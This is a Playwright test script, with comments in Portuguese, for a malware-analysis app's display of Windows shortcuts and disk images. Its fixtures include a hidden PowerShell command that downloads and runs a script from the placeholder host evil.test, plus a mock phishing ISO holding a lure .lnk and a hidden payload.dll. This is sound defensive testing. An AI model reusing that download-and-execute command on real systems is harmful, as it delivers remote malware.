// Atalhos e imagens de disco (84): aviso e secao do .lnk (destino, argumentos
// so como texto com Copiar do comando completo, janela minimizada, maquina/MAC,
// alertas); secao da imagem (formato, rotulo, ocultos, alertas), Extrair como
// amostras com confirmacao, lista com as filhas, VHDX nao listado, usuario
// comum sem extrair e "Extraido de" na filha.
import { chromium } from 'playwright';

import { createState, entries, ORIGIN, OUT, setupMock, watchErrors } from './mock-api.mjs';

const browser = await chromium.launch();
const context = await browser.newContext({ viewport: { width: 1440, height: 900 }, permissions: ['clipboard-read', 'clipboard-write'] });
const state = createState({ loggedIn: true });
const base = {
  version: 1, analyzedAt: '2026-10-29T10:00:00.000Z', size: 721, bytesAnalyzed: 721,
  detectedType: null, extensionMismatch: null, entropy: 4.2, entropyLevel: 'normal',
  strings: { total: 1, urls: [], ips: [], emails: [], paths: [], registry: [], suspicious: [] }, pe: null, iocCandidates: [],
};
const ARGS = ' -w hidden -nop -c "iwr http://evil.test/a.ps1 | iex"';
const TARGET = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe';
entries[2].staticInfo = {
  ...base,
  lnk: {
    target: TARGET, arguments: ARGS, workingDir: 'C:\\Users\\Public', relativePath: null, description: 'Fatura de novembro',
    iconLocation: 'C:\\Windows\\System32\\imageres.dll', window: 'minimized', envTarget: null, machine: 'desktop-7h2k',
    mac: '00:0c:29:ab:cd:ef', created: '2026-10-20T10:00:00.000Z', modified: '2026-10-21T10:00:00.000Z', accessed: null, targetSize: null,
    alerts: ['Abre um interpretador de comandos ou binário do sistema usado em ataques.', 'Abre minimizado (a vítima não vê a janela).'],
  },
};
entries[3].staticInfo = {
  ...base,
  diskImage: {
    format: 'iso9660', note: null, label: 'PEDIDO_2026', truncated: false,
    files: [
      { path: 'fatura.pdf.lnk', size: 1200, hidden: false },
      { path: 'dados/payload.dll', size: 204800, hidden: true },
      { path: 'LEIA-ME.txt', size: 5, hidden: false },
    ],
    alerts: ['2 arquivo(s) executável(is) ou de script dentro da imagem (ex.: fatura.pdf.lnk, dados/payload.dll).', '1 deles oculto(s).'],
  },
};
entries[0].staticInfo = { ...(entries[0].staticInfo ?? base), diskImage: { format: 'unsupported', note: 'VHDX: o conteúdo não é listado.', label: null, files: [], truncated: false, alerts: [] } };
// Filha de uma imagem (nao de e-mail): "Extraido de".
entries[0].parentEntry = { id: entries[3].id, title: 'Pedido de compra', originalFilename: 'pedido.iso' };
await setupMock(context, state);
const children = [];
const extractCalls = [];
await context.route((url) => /^\/api\/entries\/[\w-]+\/(children|extract-image)$/.test(url.pathname), (route) => {
  const path = new URL(route.request().url()).pathname;
  const json = (status, data) => route.fulfill({ status, contentType: 'application/json', body: JSON.stringify(data) });
  if (path.endsWith('/children')) return json(200, { children: path.includes(`/${entries[3].id}/`) ? children : [] });
  if (state.role === 'USER') return json(403, { error: 'Somente analistas extraem arquivos.' });
  extractCalls.push(path);
  children.push(
    { id: 'k1', title: 'fatura.pdf.lnk', originalFilename: 'fatura.pdf.lnk', status: 'PENDING', verdict: 'UNKNOWN' },
    { id: 'k2', title: 'dados/payload.dll', originalFilename: 'payload.dll', status: 'PENDING', verdict: 'UNKNOWN' },
    { id: 'k3', title: 'LEIA-ME.txt', originalFilename: 'LEIA-ME.txt', status: 'PENDING', verdict: 'UNKNOWN' },
  );
  return json(200, { created: 3, children: children.map(({ id, title }) => ({ id, title })), skipped: [] });
});
const page = await context.newPage();
watchErrors(page);

let failures = 0;
const expect = (label, ok, detail = '') => {
  if (!ok) failures += 1;
  console.log(`${ok ? 'ok  ' : 'FALHA'} ${label}${detail ? ` (${detail})` : ''}`);
};
const settle = (ms = 400) => page.waitForTimeout(ms);
const messages = async () => (await page.locator('.hpsm-msg__text').allTextContents()).map((t) => t.replace(/\s+/g, ' ').trim());
const lnkSection = page.locator('section.hpsm-section:has(.hpsm-section__head:has-text("Atalho do Windows"))');
const imgSection = page.locator('section.hpsm-section:has(.hpsm-section__head:has-text("Imagem de disco"))');

// 1. Atalho.
await page.goto(ORIGIN + `/entries/${entries[2].id}`, { waitUntil: 'networkidle' });
const warn = (await messages()).find((t) => t.startsWith('Atenção: atalho'));
expect('aviso no topo', warn?.includes('executa C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe com argumentos'), warn);
const lnkText = await lnkSection.innerText();
expect('destino e argumentos como texto', lnkText.includes(TARGET) && lnkText.includes('iwr http://evil.test/a.ps1 | iex') && (await lnkSection.locator('a').count()) === 0);
expect('janela minimizada destacada', lnkText.includes('minimizada (oculta da vítima)'));
expect('máquina e MAC de origem', lnkText.includes('desktop-7h2k · MAC 00:0c:29:ab:cd:ef'));
expect('alertas', (await lnkSection.locator('.dl-doc-alerts li').count()) === 2);
await lnkSection.locator('button[aria-label="Copiar comando completo"]').click();
await settle(200);
expect('Copiar leva o comando completo', (await page.evaluate(() => navigator.clipboard.readText())) === `${TARGET} ${ARGS}`);
await page.screenshot({ path: `${OUT}/lnk.png`, fullPage: true });

// 2. Imagem de disco.
await page.goto(ORIGIN + `/entries/${entries[3].id}`, { waitUntil: 'networkidle' });
expect('formato e rótulo', (await imgSection.locator('.hpsm-section__head').innerText()).includes('Imagem de disco (ISO 9660)') && (await imgSection.innerText()).includes('PEDIDO_2026'));
const rows = (await imgSection.locator('tbody tr').allInnerTexts()).map((t) => t.replace(/\s+/g, ' ').trim());
expect('arquivos com tamanho e oculto', rows.length === 3 && rows[1].startsWith('dados/payload.dll (oculto) 200.0 KB'), rows.join(' | '));
expect('alertas da imagem', (await imgSection.locator('.dl-doc-alerts li').count()) === 2);
await imgSection.locator('.hpsm-toolbar__action:has-text("Extrair como amostras")').click();
await settle(300);
const confirmBox = page.locator('[role=alertdialog]');
expect('confirmação explica', (await confirmBox.innerText()).includes('Extrair 3 arquivo(s) de "PEDIDO_2026" como amostras?'));
await confirmBox.locator('button:has-text("Extrair")').click();
await settle(600);
expect('pede a extração', extractCalls.length === 1);
expect('aviso de extraídos', (await messages()).some((t) => t.startsWith('3 arquivo(s) extraído(s) como amostras.')), (await messages()).join(' | '));
const linked = imgSection.locator('tbody tr').nth(1).locator('a');
expect('cada arquivo liga à amostra filha', (await linked.getAttribute('href')) === '/entries/k2');
expect('botão some depois de extrair', (await imgSection.locator('.hpsm-toolbar__action:has-text("Extrair")').count()) === 0);
await page.screenshot({ path: `${OUT}/imagem-disco.png`, fullPage: true });

// 3. Formato nao listado.
await page.goto(ORIGIN + `/entries/${entries[0].id}`, { waitUntil: 'networkidle' });
const summary = (await page.locator('.dl-summary').innerText()).replace(/\s+/g, ' ');
expect('filha de imagem: "Extraído de"', summary.includes('Extraído de: Pedido de compra') && !summary.includes('Anexo de'), summary);
expect('VHDX: observação, sem extrair', (await imgSection.innerText()).includes('VHDX: o conteúdo não é listado.') && (await imgSection.locator('.hpsm-toolbar__action').count()) === 0);

// 4. Usuario comum ve, sem extrair.
children.length = 0;
state.role = 'USER';
await page.goto(ORIGIN + `/entries/${entries[3].id}`, { waitUntil: 'networkidle' });
expect('usuário comum vê a lista sem extrair', (await imgSection.locator('tbody tr').count()) === 3 && (await imgSection.locator('.hpsm-toolbar__action').count()) === 0);

await browser.close();
console.log(failures ? `\n${failures} falha(s)` : '\natalhos e imagens: tudo ok');
process.exit(failures ? 1 : 0);
